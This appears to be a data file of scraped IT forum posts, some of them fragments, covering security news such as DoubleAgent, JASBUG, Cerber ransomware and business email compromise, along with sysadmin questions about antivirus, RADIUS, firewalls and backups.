2180137,"After all the hard work, why do security gaps still exist?","We've all seen the stats on cybercrime and the numbers keep trending upward with more attacks, more data breaches, and more business disruption. Organizations are spending hundreds of billions of dollars in cybersecurity, but the problem is still getting worse.To understand the current state of the IT security gap, Aruba partnered with the Ponemon Institute to survey 3,866 IT and IT security practitioners in Asia-Pacific, EMEA, and North America. According to this study, the expanding and blurring perimeter is a big pain point, with 62% of respondents stating that gaps in their IT infrastructure made it easier for attackers to penetrate their companies' defenses. And, 55% said it's harder to protect the expanding and blurring IT perimeter with the rise of IoT, BYOD, mobile, and cloud.Security teams know that you can't control what you see, and the reality is that IT lacks visibility into what users and devices are on their networks and what they're doing. Half of the survey respondents admitted that a lack of visibility into what users and devices were doing when connected to the IT infrastructure was the main reason for the security gap.So, what do you feel you could do to close the security gap on your network?(Source: https://news.hpe.com/after-all-the-hard-work-why-do-security-gaps-still-exist/)",0
1540902,Microsoft issues emergency patch for severe security flaw,"48 hours after learning about a critical account authentication flaw, Microsoft has issued a patch to prevent attackers from harvesting login information from users of services such as Outlook and Azure. According to ZDNet, ""the vulnerability could be exploited through phishing websites designed to harvest login tokens to later compromise user accounts and data."" Jack Whitton, the researcher who discovered the flaw, said in a blog post that a simple exploit could be used to uncover the user's credentials, which would then compromise the security of the user's accounts. ﻿The exploit itself involved ""tweaking URL-coding parameters and parsing URLs,"" which allows an attacker to bypass the typical authentication protocol. ""This root cause of the bug allows attackers to specify an arbitrary URL to POST authentication tokens, and so if an attacker has gained this data through a fake website or phishing, they can gain complete access to a user account,"" ZDNet writes. Microsoft has issued a fix, which prevents the authentication exploit from taking place. ﻿",11

151818,Security vs. the World,"This is the fifth article in the Spotlight on IT series. If you'd be interested in writing an article on the subject of backup, security, storage or virtualization for the series, PM Elise to get started.--------------------------------------------Today's networks are susceptible to more types of attacks than ever before. Social networking has made the complex art of social engineering much easier; information that black hats used to work for weeks to attain is now posted proudly and publicly all over Facebook, LinkedIn, and Twitter. This makes new variations on old attacks (like spearphishing, a phishing attack designed with a particular user or organization in mind) easier to complete.This fact creates new and more complicated issues for Network Administrators and other people who are responsible for network security. Striking a solid balance between keeping users and the network safe and secure, and keeping the users and management happy with easy-to-use security measures can be a daunting and complex task.In my experience consulting for businesses, I've found that most managers (especially in smaller firms) don't take network security (or physical security for that matter) seriously until something happens to their own systems. It doesn't always matter how hard you push for authorization to implement new security measures, or even security best practices since the mindset I've seen in most business owners is “that stuff doesn't happen to me” or the “odds” are against a breach at my business. This line of thought can pose quite a dilemma to a consultant or admin who is trying to look out for a company. Questions like “How do I convince them that this is important?” and “How can I prove to them that this control measure is worth my time (and their money) to implement?” start running through your head, and they can be difficult to answer.What has normally worked for me, is setting up a time to meet with the decision makers that you need on board in order to get things done. Sit down and have a round-table discussion in which you present your ideas; explain why you'd like to stop using the https connection and active directory authentication for remote users and switch to a VPN, explain the reasons (and there are a few) that having simple passwords on any workstation is a bad idea even though they've been running fine that way since two years before you walked in the door.So, the big question is, what is the best way to get them to agree with you? In my experience, the best way to drive your point home is to walk them through a believable scenario, or to pull current events into the discussion. Back when it was hot news, I liked to use the story of a certain former election candidate that had their web based email account hacked. Aside from the improper use of the account in the first place, the bigger issue is that all of the security question answers on the account were publicly available on the internet.Some people would say that this only is the case because of this individual's high profile, but when you stop to consider how much information is publicly available on social networking sites, it's like everyone on your network has their own little website opening their personal information to anyone who cares to look at it. You don't have to be running for office to have a webpage with a biography detailed enough to let someone you don't know discover your kid's names, know where your spouse went to college, your high school's mascot, the city you were born in or your mother's maiden name.So with all that in mind, what do you other SpiceHeads do to convince the people you work with that a current practice is in fact a security hole? I know some of you have your own IT budgets that can be spent as you see fit, but I also know that others are faced with the dilemma of convincing others to open their minds and budgets to your cause. What does it take for you to help justify your ideas and get the support you need to make changes in your organization?",0

544213,Anti Virus for just a few servers,"Basically I am looking to put an anti virus on a web server, database, domain controller, and laptop. These will be the only machines on the network as of right now. It may grow larger, but most of the employees are going to be remote users doing programming and database work. The net work is going to have a Sonicwall - webserver - sonicwall - rest of the network. The only users on the network for right now will probably be my self and co worker. So we do not have employee's to worry about infecting the network. No E-Mail is going to touch it right now. If everything takes off then it will grow and more employee's will be hired. Its a GIS venture that we are getting into. The budget is very flexible but if I can save the costs then I would prefer to, however I am use to larger networks and networks with tons of users so instantly I say ESET. Would any of your recommend any thing else? The my co-worker is mentioning BIT Defender, but I am not sure that the worry of it being a system resource hog is worth the cost, where I know ESET is light weight. I am open to any other idea's. My opinion is since the usage is going to be limited to a small demographic I would rather have performance.Our demographic is providing people with access to the web server. Not going to go into much more details about the venture but the demographic not a large number of people. Also i have not looked into this yet, I just thought about it but does any one know if ESET can also secure Android tablets? ",0
411797,Keeping Sophos Endpoint OFF our servers!?,"Hello helpful SpiceWorks community!I recently updated our Sophos Enterprise Console from 5.1 to 5.2.1.

Our best efforts haven't been able to get it uninstalled. We can uninstall the software from the server, but of course it puts itself right back on there. From the Enterprise Console, the best we can do is change the policy that's applied to the server so that it minimizes impact, disabling on-access scanning and firewall and so forth. But that's not what we want. We want it completely GONE from the servers.Sophos support has for some reason told us this is out of the scope of what they'll help us with, and researching documents and videos hasn't really come up with anything.

There is a video which shows how its being used and hot damn...Hopefully, it requires all sorts of permissions...Security researchers from Cybellum have discovered another technique cyber criminals can use to take over your computer. The zero-day attack called DoubleAgent exploits Microsoft's Application Verifier tool, which developers use to detect and fix bugs in their apps. Developers have to load a DLL into their applications to check them, and Cybellum's researchers found that hackers can use the tool to inject their own DLLs instead of the one Microsoft provides. In fact, the team proved that the technique can be used to hijack anti-virus applications and turn them into malware. The corrupted app can then be used to take control of computers running any version of Windows from XP to the latest release of Windows 10.The researchers notified these companies three months ago that their anti-virus apps are susceptible to the technique:Avast (CVE-2017-5567)AVG (CVE-2017-5566)Avira (CVE-2017-6417)Bitdefender (CVE-2017-6186)Trend Micro (CVE-2017-5565)ComodoESETF-SecureKasperskyMalwarebytesMcAfeePandaQuick HealNortonThey've been working with some of them since, but thus far, only Malwarebytes and AVG have issued a patch. Trend-Micro plans to release one soon, as well. If you use any of the three apps, you may want to update as soon as you can. To note, Cybellum only focused its efforts on anti-virus programs, but the technique could work with any application, even Windows OS itself.To better understand what DoubleAgent can do, make sure to watch the video below. It shows how it can turn an anti-virus app into a ransomware that encrypts files until you pay up.",11
1795004,Security Concerns on moving a Physical Colo to the Cloud (Iaas),"I am considering making a switch from using a physical colo to an IaaS provider.  I currently rent a whole rack at a colo that's a time zone away from me.  This poses some challenges when troubleshooting and if there are hardware issues, then hardware needs to be shipped to me for repair and then I ship back.  I use Sonicwall UTM at my main site and the colo and they are linked via Site-to-Site VPN.  I also use Sonicwall SRA appliances for remote access at each location and they are installed per Sonicwall best practice, that is, within their own separate zone and not just a port forward into the LAN.I have looked at a couple IaaS vendors but I have some concerns mostly regarding firewall/remote access.Firewall - they provide a virtual firewall/router (one of them I looked at used vShield and the other uses Clavister).  My concern here is that I may not have any control over the firewall services such as IPS, GAV, Blacklisting IP's.  Plus, I also like the Geo-IP filtering that I get with Sonicwall.  (I can provide my own physicall firewall but that comes at a premium for hosting and cross-connecting to the virtual environment),Remote Access - Sonicwall provides a virtual appliance for their SRA which is great; however, my concern is deploying it securely in this environment. When using a 3rd party firewall, Sonicwall documentation only shows putting the SRA on the LAN and then port forwarding to it.Questions:Has anyone use IaaS?  What were your experiences with the routing/firewall features?  How did you configure your remote access for your users into the IaaS?  Has anyone used Sonicwall SRA with 3rd party firewall?  Did you just port forward or did you perhaps use DMZ?Effectively, within the IaaS environment, wouldn't the SRA VA be on the same host as my other VM's?  Would this be cause for concern?      ",0

2180897,Top 7 IT Security Trends in 2019,"Across the IT security landscape, the year of 2018 was never prosaic or boring. We saw breaches of such giants as British Airways, Macy’s and Facebook, data privacy scandals around Google and Facebook (again), and the GDPR shakeup, to name just a few.Now it is time to look at what the next year may bring us. Together with Netwrix’s team of security analysts, we have worked out the IT security trends that will likely influence businesses in 2019. Make sure to get yourself covered!#1. Compliance rules will get broader and stricter.We predict two major trends in the realm of compliance.First, attention towards protecting personally identifiable information (PII) will continue to rise in 2019, so we will witness the growth of data security and privacy laws. Following the EU’s experience with GDPR, the U.S. states of New York, Colorado and California have already passed local data privacy laws that affect companies storing the personal data of the states’ residents. Just like GDPR, they require organizations to maintain PII security procedures, implement disposal policies and comply with accelerated breach notification requirements.Within the next five years, we should expect adoption of a national data privacy standard in the U.S. It will echo the GDPR scenario, with scattered local laws being united into a EU-wide regulation. Therefore, companies must ensure that they will be ready to comply by adopting security best practices like ongoing IT risk assessment, regular auditing, and ensuring profound visibility into data repositories and user activity.Second, with the upsurge in data breaches in 2018, we anticipate stricter enforcement of existing compliance standards. Most likely, the first in line will be data breach notification rules, due to the increased number of incidences in which companies hid breaches — for instance, it took Cathay Pacific seven months to notify authorities about the exposure of 9.4 million passenger records, and it took Google six months to disclose that data on 500,000 Google+ users was leaked.Indeed, stricter enforcement has already begun. The Office of the Australian Information Commissioner introduced mandatory reporting on data breaches within 30 days. Also, the Gramm Leach Bliley Act (GLBA) is about to enact a requirement to notify consumers of a data breach within six months. We are convinced that more and more standards will tighten in 2019, and stricter breach notification rules are just the start.#2. Security will become more data-centric.In a cloud and BYOD-enabled world, the concept of a network perimeter fades away. With a borderless environment and far larger amounts of information, IT pros need to turn from perimeter defense to data-centric security. Even if your company does not store super-secret Nutella recipes or national defense plans, it certainly stores personal data — on employees, customers or both — that needs protection due to tightened compliance regulations and increased attention from the public about the security of their PII.To succeed in 2019, companies should focus on data protection. The biggest challenge is knowing what kind of data you store, where it is located, who has access to it and how it is handled. Thus, data-centric security will drive an increased need for data discovery solutions. Ongoing data discovery will be a must in 2019.#3. Cloud adoption will accelerate.The popularity of cloud services and solutions will steadily rise. According to LogicMonitor’s study, 83% of enterprise workloads will be in the cloud by 2020. Certainly, the problem of securing data stored in the cloud will become more acute.General security best practices will stay the same: Encrypt your data; grant access on a need-to-know basis; implement data recovery processes; be on the lookout for open or unprotected APIs; and streamline monitoring of your cloud infrastructure. To automate the execution of certain security operations and minimize human error risk, you will also have to consider AI and machine learning technologies (more on this in #4).Cloud solutions will be especially popular in large enterprises, which often hire their own DevOps teams to develop in-house software to refine or automate certain processes. For the sake of price and simplicity, this custom software is developed primarily in the cloud. Organizations need to build security into these solutions during the development and testing stages, which  means that DevOps must evolve into SecDevOps teams, ensuring that security is not an afterthought but a full-on part of the process.#4. AI and advanced analytics will be more sought-after.The growing complexity of IT infrastructures, massive data growth, strict compliance regulations and the rising popularity of cloud technologies have been headaches for businesses for a long time. Given the severe shortage of InfoSec skills and employees, businesses will continue to look for ways to automate IT security processes, driving demand for solutions that incorporate advanced analytics, artificial intelligence (AI) and machine learning (ML) technologies.We expect an increased demand for sophisticated solutions with AI elements, and vendors will respond by inventing more and more comprehensive ways to automate security processes to facilitate decision-making. Within the next few years, we should expect this functionality in all aspects of the security industry. Moreover, traditionally complex and expensive solutions will have to adapt to increasing market demand for more lightweight alternatives. We can expect solutions that are easier to deploy, cheaper and possibly less sophisticated — but still based on ML.However, before getting sucked in by the buzz around AI, businesses must ensure to have essential security controls and processes in place, such as regular risk analysis, IT environment monitoring, configuration management and so on. Only once their security posture is mature enough should organizations adopt more complex technologies like machine learning or UEBA.#5. Blockchain will be used for IT security.The potential for applying blockchain technologies for data security will be realized more and more. As a digital ledger of data transactions distributed among a network of computers without a central control hub, blockchain eliminates the problem of a single point of failure and makes it hard for malefactors to compromise large volumes of data. Plus, such solutions help verify data transactions and bring more transparency into a company’s operations.There are already successful examples. The U.S. Food and Drug Administration (FDA) built a blockchain-based health data sharing platform that facilitates real-time exchange of patient data between the agency and partner hospitals. Meanwhile, Ernst & Young launched its fourth blockchain project. Together with Microsoft, they developed a blockchain solution designed to enable increased trust and transparency of the rights and royalties management process.Blockchain-based data security would not be widely adopted in 2019, but market penetration will steadily rise. Our advice to data security leaders is to get familiar with the technology and consider adopting it in the future.#6. IoT devices will continue to be at risk.Connected devices that are capable of data transmission have already become a part of our daily lives.  Businesses and consumers use a variety of them: Alexa and other voice-activated home devices, smart locks, insulin pumps, pacemakers, smart air conditioning and so on.IoT devices are currently too vulnerable to hacking. Vivid examples include St. Jude’s cardiac devices, which a hacker could access in order to deplete the battery or administer incorrect pacing and shocks, and a hijack of the digital systems of a Jeep with a Wired journalist riding it. Also, Ben-Gurion University researchers found that hackers can easily access baby monitors, home security cameras and other devices by cracking the default passwords common for many brands. One of the reasons is that IoT devices are still considered cool, so they attract startups and entrepreneurs who do not always consider security to be essential. Instead, their mantra is get a cool idea, define a minimum viable product (MVP) and ship ASAP. In too many cases, security is not part of that MVP, unfortunately.We expect that in 2019, hackers will move from testing the waters to initiating new types of attacks aimed at IoT. To be secure, at a minimum, consumers should make sure to have a unique, strong password for each device and never rely on the default one. We also hope that manufacturers will pay more attention to properly securing their products rather than simply being the first to release them at an attractive price. Fortunately, California has already passed an IoT cybersecurity law and these technologies might be regulated by other states and countries before something really bad happens.#7. Personal data breaches will continue.Hundreds of data breaches happened in the last few years, but more importantly, the volume of personal information stolen is growing exponentially. The chances that this data will be used for extortion  or other nefarious purposes are extremely high — and other malicious actors need only to claim that they have obtained personal data to blackmail people. The most recent example is an ongoing sextortion scam in which racketeers contact breached email addresses from publicly available lists and then blackmail them with false claims that they were caught viewing porn, even though their computers were not even hacked.A similar scenario can be used to blackmail an organization’s employees, but instead of asking for money, the bad guys demand the company’s IP or other valuable data. This risk of blackmail victims turning into malicious insiders is another reason for businesses to keep a close eye on employee permissions and activity.There are plenty of other ways that attackers can benefit from stolen personal data. For example, they can use it for targeted phishing attacks, for accessing corporate and banking systems under a victim’s name, and other types of identity theft.ConclusionSome people might say that we live in a creepy Black Mirror TV show era, when your own pacemaker can kill you or a blackmailed employee can trade your company’s IP for silence about their porn habit. But there is no point in panicking. Forewarned is forearmed:  To stay safe in 2019, employ basic security controls, be understand and comply with any regulations you might be subject to, and ensure to have visibility into your entire IT infrastructure and data.

755780,FBI Alert: Ransomware Infection Leads To Wire Transfer Fraud,"OK, Heads-up! Here is the deal. The FBI and the Internet Crime Complaint Center (IC3) two days ago warned about a new version of a man-in-the-middle scam that targets your CEO, CTO, CFO, and/or Comptroller. I would send these people a link to this blog post immediately. Better safe than sorry. The FBI calls it the ""Business E-Mail Compromise"" (BEC), and this is the scam: Your C-level exec receives a business email from an existing, well-known vendor who request a wire transfer to a specific bank account. The email looks legit, it comes from a known, trusted business associate, and is about a recent delivery or transaction. And the whole thing is bogus. The bad guys have penetrated your network and have been monitoring and studying what went on for considerable time, because they can accurately identify the individuals and protocols to perform wire transfers within your specific business environment. The last 14 months there were 1198 victims in the U.S with a total loss of 180 million dollars. The wire transfers get rapidly forwarded and usually wind up at banks in Hong Kong so you are dealing with the Chinese cyber mafia here. The FBI said: ""Victims may also first receive “phishing” e-mails requesting additional details of the business or individual being targeted (name, travel dates, etc.) Some victims reported being a victim of various scareware or ransomware cyber intrusions, immediately preceding a BEC scam request.""It looks to be fairly obvious what goes on. Initial phishing emails and/or ransomware attacks drop keyloggers and trojans on the workstation of an employee. With these credentials they tunnel into the network and put keyloggers on C-level exec workstations. After studying the traffic, the bad guys craft an email that is carefully spoofed to look as legit as possible. There are a few different versions of this scam which the IC3.gov site specifies, link in Point 3.What you can do about it:Alert your execs. These scams are getting more sophisticated by the month and be on the lookout.Grab this Social Engineering Red Flags PDF, print and laminate it, and give it to your C-level execs.

397024,Cogent 100Mbps w/ Sonicwall,"We are now using Cogent's 100 mbps fiber circuit we still have our 5mbps copper over ether b/c I'm having issues with the Cogent speeds.  Our our network is behind Sonicwall's NSA 250MW.  When I do a speed test on Cogent's line, I get 15mbps download and 40mpbs upload.  I would be somewhat ok with this since we are paying the same amount per month for Cogent and MegaPath.  However, the problem is when I actually download a document that is 5mb in size from the internet, it takes Cogent's fiber circuit about 2 minutes to complete and takes MegaPath less than 30 seconds.  So basically, the speed test says that Cogent's line is faster than Megapath, but when I actually download documents from the internet, Cogent is MUCH slower.  I've performed this test both during work/busy hours and during night/weekend/off hours.  I've already updated Sonicwall NSA 250MW's firmware (SonicOS Enhanced 5.8.1.13-1o) and configured WAN interface for speed of 100mbps and duplex.  Can anyone relate or have any solutions?Thank you!",5
395986,Pros and Cons of Admin Rights,"EDIT: My org has around 1800 computers, and around 400 users. We're an educational environment.Last year my org laid off a bunch of support staff.So naturally, there's not enough support to go around, and the tickets just build in the queue.Several vocal people in 'the community' have asked why users aren't allowed to install their own software.Now, years ago when this org only had a couple hundred machines, and most of the were Windows 98, I remember what that was like, but the powers that be don't. They want IT to consider the option.In the spirit of brainstorming, I'm trying to give it a go, but now I have this knee-jerk reaction that makes we want to scream ""NO!"" and run out the door. So I ask the community: What are the pros of giving user's admin rights? I know the cons, well, most of them, but if there are non-obvious ones (security/malware/virus risks, broken machines due to users' installing every toolbar and screensaver known to the Internet, etc) those would be useful to know too.",0

Currently it is accessed via passphrase and we want to do away with this and set up RADIUS authentication. Our APs and controller have the capability, all users are running laptops and we have AD infrastructure all set, so my understanding is that we need to enable AD cert services and connect it all up. I have read about having an offline root CA and then setting up a subordinate CA - is this necessary/recommended? We have around 100 users who are usually docked, so will only need wifi auth occasionally, so I'm assuming having additional subordinates is overkill? Would it be an issue to run the certificate services on our DC and an additional server for failover and keep it all online rather than having an offline root?Excuse my ignorance, this is new to me! ",0

One particular research by McAfee unfolded online searches associated with Ronaldo'sname as quite possibly returning hits which divert Web-surfers onto harmfulsites delivering Trojans or other malware onto the users' PCs. McAfee published a list named ""The Red Card Club"" that contains thenames of football icons which are likely to disseminate malicious softwarewhile it's similar to a Who's Who about players who're going to play the FIFAWorld Cup tournament of 2014 at Brazil that is about to start on 12th June,2014. As per McAfee's study, football admirers bear the biggest danger while surfingwebsites presenting videos and screensaver downloads depicting the players'remarkable dexterities. An online search for Cristiano Ronaldo related materialresults in an over 3.7% possibility of confronting one site, which contains adware,spyware, viruses, phishing, spam along with more malware. McAfee noted that like usual with other social hypes, Internet crooks weretaking advantage of netizens' enthusiasm for the globally best game towardsenticing them onto URLs harboring malicious code having the ability to taint anend-user's computer while grabbing his passwords along with other personalinformation. Infosecurity-magazine.com published this dated June 5, 2014. And so far as danger rates are concerned, close to Ronaldo is Lionel Messi ofArgentina (3.72%), Iker Cassillas of Spain (3.34%), Neymar of Brazil (3.14%)and Karim Ziani of Algeria (3%). EMEA CTO Raj Samani for McAfee stated that cyber-crooks couldn't overlook thetemptation of abusing 'fever-pitch' exhilaration surrounding the currentsummer's classic stars within Brazil. However, it bore a threat whereby theexpectation would cause fans to take down matter online, they mustn't, forgaining their football thrill, he lamented. Infosecurity-magazime.com publishedthis dated June 5, 2014. McAfee urged browsing only renowned or authorized news websites, nevertheless,cautioned that those weren't essentially free from malware either.Consequently, it would be good to utilize secured search tools, the securityfirm suggested.﻿ ",0

1916359,Cerber ransomware is now being used to encrypt company databases,"As reported in a recent ITProPortal article, McAfee has warned that the cybercriminals behind the Cerber ransomware have begun to target businesses as well as individuals by encrypting their databases until payment is received.During July, those responsible for Cerber launched over 160 campaigns at 150,000 users. These attacks generated $195,000 during that month of which the developer behind the ransomware received $78,000. Overall it is estimated that creating and using ransomware to launch cyberattacks earns the creators of the malware and those who employ it in their attacks around $1 million to $2.5 million a year.According to the security strategist Matthew Rosenquist, cybercriminals will likely move on from individuals to businesses in an effort to earn even more from their attacks. Rosenquist offered further insight on the shift in how ransomware is being deployed, saying: “[Cerber] now attempts to stop database processes running on the target system so it can encrypt the data. This is a significant shift in focus from consumers to businesses, which typically run databases containing important operational data. When database files are open and in use by software, they cannot easily be encrypted.”In order to stay alert regarding Cerber, Rosenquist recommends keeping an eye on databases that stop abruptly, as this may be an indication that Cerber has begun to encrypt the database.",0

1323985,5 big challenges facing CIOs and IT leaders in 2016,"5 big challenges facing CIOs and IT leaders in 2016﻿Education Summary: The role of the CIO is evolving. In the near future, CIOs will face new challenges and take on new roles. The most successful CIOs are those that recognize and adapt to these changes. In this article, we explore 5 such challenges that CIOs must face in the coming year.Technology plays a larger role in the business than ever before. It’s evolved from something that supports the business, to something that drives many businesses.As technology evolves, so does the role of the IT department. They’re moving from a back-office function that supports the business to a true business driver.This change represents amazing opportunities for CIOs and IT leaders. Because of technology’s increased role in the business, they have the opportunity to deliver more business value than ever before. The most successful CIOs are those that recognize these evolving challenges and adapt to meet them.What are these challenges? What pressing issues will CIOs and IT leaders address in the coming year? As this is such a broad topic, we’re breaking it up into two parts. We’ll cover the first 5 challenges today, and the rest in a future article. Here are 5 of the biggest challenges facing CIOs and IT leaders in the near future:Challenge #1: Prepare for the IoT data explosionThe Internet of Things (IoT) is poised to explode. Gartner predicts that the amount of connected “things” will reach 25 Billion by the year 2020.This rapid growth brings both opportunities and challenges. On one hand, it promises to make everything more intelligent and efficient. We’re already seeing these advancements in the rise of web connected buildings, smart cars, and even smart clothing.However, these “smart” devices generate massive amounts of data. The challenge facing CIOs revolves around making sense of this data influx. How will you collect and capitalize on this upcoming avalanche of data?“There are a lot of people talking about the potential of the Internet of Things (IoT) and CIOs will definitely be starting to get more questions about how it will affect their business and how they can leverage it to gain competitive advantage,” says Nic Grange, CTO at Retriever Communications. “Even if they believe it is overhyped they won’t be able to ignore it. They’ll need to formulate a strategy on what their organization is going to do about it over the next 12-18 months. This may just involve experimentation to start with. How far they can take it will depend on how advanced they are in the more traditional areas mentioned above which are key to supporting an ever-expanding and dispersed infrastructure.”Challenge #2: Deliver a clear view of your data (across many systems)Is this a new challenge? Not at all. It’s a challenge that’s plagued businesses for years, and only grows worse with time. They operate on multiple systems–not all of which communicate with each other. This is only complicated by the rise of the cloud. Instead of simply tying in-house applications together, businesses must now integrate data from both cloud and in-house systems.Why is this such a challenge? Without integration, data access is limited. Creating simple reports is a time-consuming process. I still see many businesses pulling data out of disparate systems and merging it in spreadsheets. Not only is this an error-prone method, it wastes time.The problem: We live in a data-driven world. More than ever, your ability to turn your data into meaningful management information plays a critical role in your business. However, many businesses still struggle in this area–a problem which will lead to bigger problems if not addressed.Solving this problem requires that CIOs make integration a top priority. Also, as explained below, CIOs must demand integration from their providers if they hope to deliver easy data access.“From my perspective at a health IT company, the biggest challenges CIOs and IT leaders will face is interoperability,” says Sarah McMullin, Director of Business Development at Camino Information Services. “Getting software and applications to play nicely together shouldn’t be as hard as it is, but the major players in the market hold on to the keys so tightly for fear they will be run out of business by someone more agile. “Don’t improve on our product by bolting yours onto the front because people might notice our product needs improvement.” There are always a lot of growing pains at the cost of better results for end users. This challenge of interoperability must first be addressed from the inside out: Be willing to work with others, even outsiders. Rather than seeing new products as threatening, see how they can improve your existing offering in a way that increases sales. For CIOs who are purchasing and not developing, demand more from your provider. Demand interoperability.”Challenge #3: Bridge the growing skills gapWhat do CIOs say is the single largest barrier to success? Talent. As Gartner mentions in their CIO Agenda Report, “Talent has now been recognized globally as the single biggest issue standing in the way of CIOs achieving their objectives.”This isn’t a new problem, but I include it in this list because it’s such an important challenge. As technology evolves at breakneck speed, this IT skills gap is widening. Businesses are having more and more trouble finding IT pros with the modern skills they require–and the problem is only growing worse.How can you address this skills gap? Gartner outlined a few strategies CIOs should try in their CIO Agenda Report mentioned above. Additionally, this article also lists 6 ways to address the skills gap.Challenge #4: Adapt to the mobile workforceMobile usage has exploded, and brings major changes for CIOs and IT leaders. Mobile not only changes how we access and interact with business applications, it changes the way we work.How so? Mobile devices largely eliminate the need to work in a physical location. In fact, Forrester finds that one-third of all employees are considered “anywhere/anytime workers.” More and more, a modern workforce is a mobile workforce.The challenge for CIOs: How will you enable this mobile workforce, while securing your data?“One of the biggest challenges facing CIO’s and IT professionals is the rise of mobile work environments,” says Fred Guelen, President of North America and CFO of Planon. “Last year marked the first time that access to the internet via mobile devices, such as phone and tablets, surpassed access via desktop and laptop computers, according to smartinsights.com. Employees no longer arrive en masse at 9am and leave at 5pm, which requires employers to have an exceptional amount of flexibility in terms of “time in the office.” While companies must embrace the flexible workspace, it requires new ways to foster more efficient collaboration, knowledge-sharing, flexibility, speed, innovation, and productivity through technology.Over the next decade, new smart assets and facilities will enter offices, factories, and homes in numbers we’ve never seen before. A strong CIO or IT leader understands that to manage a flexible workspaces, it will be critical to bring all relevant data like spaces, workplaces, floor areas, departments and people together in one central database is the first step in professional space management and workplace innovation.”Challenge #5: Make Security an Organizational effortThe number of U.S. data breaches reached a record high in 2014, with 43% of companies experiencing a data breach. That number is expected to rise this year.One study finds that the average cost of a data breach has increased to $3.8 million–up from $3.5 million a year ago. This includes all aspects of a breach, like hiring experts to fix it, offering help to your customers, repairing your damaged reputation, and more.“In 2016, keeping safe against cyber attacks will stay among the main IT challenges,” says Michael Fimin, CEO and co-founder of Netwrix. “Higher risks, stricter regulations and more publicity around data breaches make IT security a common issue for most organizations. While hacks continue to collect millions of business critical and personal data records from social media, health care and financial institutions, more business owners and executives become aware of the risks. The business goal transforms from prevention of cyber security attacks to its timely detection and adequate response.”“Regular control over user behavior becomes a high-level task for CIOs and IT leaders due to the impact of user mistakes and malicious insiders on security posture. The need to know what is happening across the network will bring us to the era of swift evolution and wide adoption of automated user behavior analytics.”How can you keep your business data secure? Start with the main cause of security breaches: Your employees. The fact is, studies find that human error is the leading contributor to breaches.The security challenge facing CIOs revolves around creating a culture of security. It must become an organizational effort, starting from the top down. To learn more, here’s a two part article (part 1 & part 2) on ways to keep your data secure.SummaryNow, these are just 5 important challenges you can expect to see in the near future, but these are just the tip of the iceberg. Is there anything you would add to this list? If so, please share your thoughts in the comments.﻿",11

787632,New Windows JASBUG vulnerability requires immediate attention from sysamdins!,"Got some news happening around the world right now!New Windows JASBUG vulnerability requires immediate attention from systems administratorsMitigation requires reconfiguration of affected computers in addition to patching.A critical new vulnerability affecting the most recent versions of Windows will require active intervention from systems administrators, who will need to reconfigure the operating system in addition to applying a patch. The Microsoft Windows Group Policy Remote Code Execution Vulnerability (CVE-2015-0008) primarily impacts on corporate users since it affects computers that are members of an Active Directory service. Most home users will be unaffected , since their computers are usually not configured in this way.Nicknamed “JASBUG” following its discovering by JAS Global Advisers, the vulnerability could allow an attacker to gain control of a domain-configured computer if they convince the victim to connect to an attacker-controlled network. If an attacker gained access to a victim’s computer, they would be able to remotely execute code, allowing them to potentially steal data or install malware on the computer. The vulnerability affects Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, Windows 8.1, Windows Server 2012, Windows Server 2012 R2, Windows RT, and Windows RT 8.1. Microsoft has already issued a Security Bulletin and patch for the issue. The vulnerability also affects Windows Server 2003, but no patch will be released. Microsoft said it would be infeasible to build the fix for this version. Windows XP and Windows 2000 are also affected, but these operating systems are no longer supported by Microsoft.The vulnerability hadn’t been publicly disclosed prior to patching and Microsoft has said that it has found no evidence of its exploit in the wild. Unlike many vulnerabilities, addressing this issue has required the creation of a number of new Windows features and Microsoft has said that in order to protect affected computers,  additional configuration by a systems administrator is required in addition to deploying the patch. Guidance on configuration is provided in Microsoft Knowledge Base Article 3000483.Advice for businessesSymantec advises affected organizations to treat this vulnerability as an urgent priority. Since mitigation requires active intervention on the part of systems administrators in addition to patching, this vulnerability may attract the attention of attackers attempting to capitalize on inattention from administrators relying on automatic security updates.﻿That's the latest from the Symantec Security Response team﻿﻿. If you are looking for info on JASBUG or any other hot item in the world of cyber security, drop me or our other Security GG's a line to let us know how we can help!",11

I'm using only SSL communication through the port to talk to the various services which I believe helps. I also have a VPN running on the NAS for the automated downloading that my media services use.Bottom line is I think having mod_security running would assist in securing port 443 further, but just can't get it to install.My setup is:cable modem => ASUS Router (port443 forward to 8081) => NAS and home network.Thank you in advance, and any constructive criticism would be welcome.Zane",0
630970,What makes a cyber attack go big?,"Cyber attacks have been worming their way through to us for decades. Some go big and some don't. So what makes a vulnerability become a big one? I found this article pretty interesting that hashes out some ideas as to why this is. The author notes three nontechnical factors that are often involved: Motivation and intent: A criminal agency, a spy organization, or another entity wants to use a method to achieve one or more goals. Loss of control: The malware coder didn't seem to realize how quickly his creation would spread Placement and timing: The malware happened to resonate with people ﻿What do you all think?

627707,Backup Exec 2014 - Duplicating Synthetic Backups,"Just upgraded from 2010 to 2014 SP1, and while everything appears to be OK for the most part, I did run into a situation with my Synthetic backups.In 2010 I had a policy template set up to run an Incremental daily, then a synthetic weekly and a synthetic monthly.  The monthly synthetic superseded the weekly synthetic, and then I had duplication to tape jobs set to trigger upon completion of the weekly/monthly synthetic.  The duplication job used a different media set depending on whether a weekly or monthly synthetic had been run.After upgrading to BE 2014, all the synthetic jobs appeared to come through (the weekly and the monthly), but when I edit the backup definition only the weekly synthetic and weekly duplication jobs are not shown.  I kind of get the impression that what I'm did (or at least the way I did it) are not supported in 2014?  I'm looking for some insight on how I can duplicate my synthetic jobs to a weekly media set the first 3-4 weeks of each month, and then have them duplicate to a monthly media set the last week of each month.  If duplication jobs could supersede each other it would be easy, but apparently they cannot.Here's what I see in BE 2014:What am I missing?  Thanks in advance.",0
